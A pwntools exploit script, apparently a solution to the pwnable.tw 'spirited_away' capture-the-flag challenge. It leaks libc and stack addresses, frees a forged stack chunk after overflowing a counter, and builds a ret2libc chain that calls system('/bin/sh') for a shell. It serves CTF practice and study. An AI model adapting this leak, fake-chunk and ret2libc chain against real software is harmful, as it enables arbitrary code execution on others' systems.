from pwn import *
import time
context.binary=exe=ELF('./spirited_away_patched',checksec=False)
libc=ELF("./libc_32.so.6",checksec=False)
p=process(exe.path)
#p=remote("chall.pwnable.tw", 10204)
def GDB():
    gdb.attach(p,gdbscript='''

        b*0x804878a
        c
        '''
        )
    input()

def survey(name,age,comment):
    p.sendlineafter(b" <y/n>: ",b"y")
    p.sendlineafter(b"name: ",name)
    p.sendlineafter(b"age: ",f"{age}".encode())
    p.sendlineafter(b"movie? ",b"A")
    p.sendlineafter(b"comment: ",comment)
#GDB()
name=b"BATMAN"
age=19
payload=b"B"*50
p.sendlineafter(b"name: ",name)
p.sendlineafter(b"age: ",f"{age}".encode())
p.sendafter(b"movie? ",b"A"*73)
p.sendafter(b"comment: ",payload)
p.recvuntil(b"A"*72)
leak=int.from_bytes(p.recv(4),"little")
log.info("[+]leak:"+hex(leak))
libc.address=leak-0x1b0041
log.info('[+]libc base:'+hex(libc.address))

name=b"BATMAN"
age=19
payload=b"B"*50
reason=b"C"*80
p.sendlineafter(b" <y/n>: ",b"y")
p.sendlineafter(b"name: ",name)
p.sendlineafter(b"age: ",f"{age}".encode())
p.sendafter(b"movie? ",reason)
p.sendafter(b"comment: ",payload)
p.recvuntil(b"C"*80)
leak=int.from_bytes(p.recv(4),"little")
log.info("[+]stack leak:"+hex(leak))
fakechunk=leak-0x60
log.info('[+]fake chunk address:'+hex(fakechunk))

for i in range(99):
    print(f"lan{i}")
    survey(name,age,payload)

p.sendline(b"y")
p.sendafter(b"name: ",name)
reason = flat(
    0,0,
    0, 0x41
    )
reason+=b"P"*0x38
reason+=p32(0)+p32(0x1fbb0)
p.sendafter(b"movie? ",reason)
payload=b"B"*84
payload+=flat(fakechunk)
p.sendlineafter(b"comment: ",payload)

log.info("[+]ROPPING:")
#### ROPPING########################
p.sendline(b"y")


pop_edi=libc.address+0x000177db
ret=libc.address+0x0000018b
rw_section=0x804aa00
name=b"A"*64+p32(rw_section)
name+=flat(
    libc.sym['system'],
    exe.sym['main'],
    next(libc.search(b"/bin/sh")),
    0,0,
    )
p.sendafter(b"name: ",name)
reason=b"C"*80
p.sendafter(b"movie? ",reason)
payload=b"B"*84
p.sendlineafter(b"comment: ",payload)

p.sendlineafter(b" <y/n>: ",b"n")
#p.sendline(b"cd /home/spirited_away/flag")

p.interactive()
